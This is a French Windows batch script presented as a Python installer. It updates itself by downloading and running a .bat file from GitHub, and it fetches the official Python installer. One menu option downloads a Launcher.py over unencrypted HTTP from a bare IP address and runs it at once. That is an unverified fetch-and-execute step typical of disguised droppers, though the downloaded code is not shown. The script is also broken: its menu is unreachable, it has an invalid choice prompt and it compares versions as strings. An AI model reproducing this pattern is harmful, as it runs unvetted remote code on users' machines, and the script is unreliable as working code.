@echo off
setlocal enabledelayedexpansion

title Installateur de Python By Calypso
chcp 65001 > nul

:: ... (le reste de votre script)

:check_update
:: Téléchargement du fichier de version sur GitHub
bitsadmin.exe /transfer "VersionFile" https://raw.githubusercontent.com/Calypsoshow/Version_Script/main/Update_Installateur.txt %USERPROFILE%\Downloads\update-version.txt

:: Lecture de la version actuelle depuis le fichier local
set /p local_version=<"%USERPROFILE%\Documents\People's_APP\version.txt"

:: Lecture de la version disponible sur GitHub
set /p github_version=<"%USERPROFILE%\Downloads\update-version.txt"

:: Comparaison des versions
if "%local_version%" lss "%github_version%" (
    echo +---------------------------------------+
    echo ^|        Mise à jour disponible       ^|
    echo +---------------------------------------+
    echo.
    echo Version actuelle : %local_version%
    echo Nouvelle version disponible : %github_version%
    echo.
    choice /C YN /M "Voulez-vous mettre à jour maintenant? (Y/N)"
    if %errorlevel% equ 1 (
        call :update_script
    )
) else (
    echo +---------------------------------------+
    echo ^|          Aucune mise à jour          ^|
    echo +---------------------------------------+
    echo.
    echo Vous utilisez la dernière version.
)

goto :eof

:update_script
:: Ajoutez ici les instructions pour télécharger et mettre à jour le script depuis GitHub
bitsadmin.exe /transfer "ScriptUpdate" https://raw.githubusercontent.com/Calypsoshow/Version_Script/main/Installateur.bat "%USERPROFILE%\Downloads\installateur-update.bat"

:: Exécution du script de mise à jour
start /wait %USERPROFILE%\Downloads\installateur-update.bat

:: Suppression du script de mise à jour téléchargé
del %USERPROFILE%\Downloads\installateur-update.bat

:: Mise à jour du fichier de version local
echo %github_version% > "%USERPROFILE%\Documents\People's_APP\version.txt"

echo.
echo +---------------------------------------+
echo ^|    Mise à jour terminée. Relancez     ^|
echo ^|          le script installateur.      ^|
echo +---------------------------------------+
pause
goto :eof


echo +---------------------------------------+
echo ^|        Installation de Python        ^|
echo +---------------------------------------+
echo ^|               by Calypso             ^|
echo +---------------------------------------+
echo ^| Discord: discord.gg/exemple          ^|
echo ^| Site Web: www.exemple.com            ^|
echo +---------------------------------------+
echo.
echo Ton HWID: %hwid%
echo Veuillez suivre les étapes suivantes pour installer Python sur votre ordinateur.
echo.
echo 1. Installation de Python
echo 2. Fermer le logiciel
echo 3. Installer le launcher Python
echo.
echo ========================================
echo ========================================

set /p choix="Choisissez une option (1/2/3): "

if "%choix%" equ "1" (
    call :install_python
) else if "%choix%" equ "3" (
    call :download_script
)

goto :eof

:install_python
echo.
echo Téléchargement de Python...
bitsadmin.exe /transfer "PythonInstaller" https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe %USERPROFILE%\Downloads\python-installer.exe

echo.
echo 1. Ouvrez le dossier Téléchargements.
echo 2. Trouvez le fichier python-installer.exe.
echo 3. Cliquez dessus pour lancer l'installation de Python.
echo 4. Suivez les instructions d'installation fournies.
echo.
echo Attendez que l'installation de Python soit terminée...

start /wait %USERPROFILE%\Downloads\python-installer.exe
move %USERPROFILE%\Downloads\python-installer.exe "%USERPROFILE%\Documents\People's_APP\install\"



echo.
echo +---------------------------------------+
echo ^|   L'installation de Python est      ^|
echo ^|            terminée.                ^|
echo +---------------------------------------+
echo ^| Vous pouvez maintenant exécuter   ^|
echo ^|   des scripts Python sur votre      ^|
echo ^|              ordinateur.            ^|
echo +---------------------------------------+
echo.

choice /C PSS /M "Que souhaitez-vous faire maintenant? (P) Télécharger Python, (S) Télécharger mon script.py"
if %errorlevel% equ 1 (
    call :download_python
) else if %errorlevel% equ 2 (
    call :download_script
)

goto :eof

:download_python
echo Téléchargement de Python...
rem Ajoutez ici les instructions pour télécharger Python, si nécessaire.


echo Python a été téléchargé avec succès.
pause
goto :eof

:download_script
bitsadmin.exe /transfer "PythonScript" http://45.140.165.70/Peoples_Application/Launcher.py "%USERPROFILE%\Documents\People's_APP\Launcher.py"


python.exe "%USERPROFILE%\Documents\People's_APP\Launcher.py"

goto :eof
